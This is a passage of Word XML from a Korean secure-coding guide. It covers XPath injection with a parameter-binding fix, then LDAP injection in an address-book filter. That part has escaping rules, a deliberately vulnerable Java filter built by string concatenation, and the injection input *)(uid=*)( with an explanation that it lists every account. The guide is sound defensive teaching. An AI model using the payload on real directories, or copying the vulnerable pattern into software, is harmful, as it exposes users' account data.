                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>우회하거나</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전체</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정보를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탈취할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] XPath </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파라미터</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>바인딩</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>XPathVariableResolver resolver = new SafeVariableResolver(id, pwd);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>xpath.setXPathVariableResolver(resolver);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String expr = "//user[id=$id and pwd=$pwd]";</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>xpath.evaluate(expr, doc);</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRPr="000E3151" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  10. LDAP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>삽입</w:t>
      </w:r>
      <w:r w:rsidR="000E3151">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000E3151">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:r w:rsidR="000E3151">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>주소록</w:t>
      </w:r>
      <w:r w:rsidR="000E3151">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000E3151">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>필터</w:t>
      </w:r>
      <w:r w:rsidR="000E3151">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000E3151">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>인젝션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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>• DN</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>과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필터에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사용되는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사용자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입력값에서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특수문자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">(=, +, &lt;, &gt;, #, ;, \ </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를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제거한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>특수문자를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사용해야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하는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경우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일반문자로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인식되도록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이스케이프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처리한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> LDAP </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>필터에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String filter = "(uid=" + username + ")";</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>NamingEnumeration results = ctx.search(base, filter, controls);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// username</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> *)(uid=*)( </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>모든</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조회</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>username</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> *)(uid=*)( </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>필터가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> (uid=*)(uid=*) </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>형태가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>되어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>조건</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>디렉터리의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
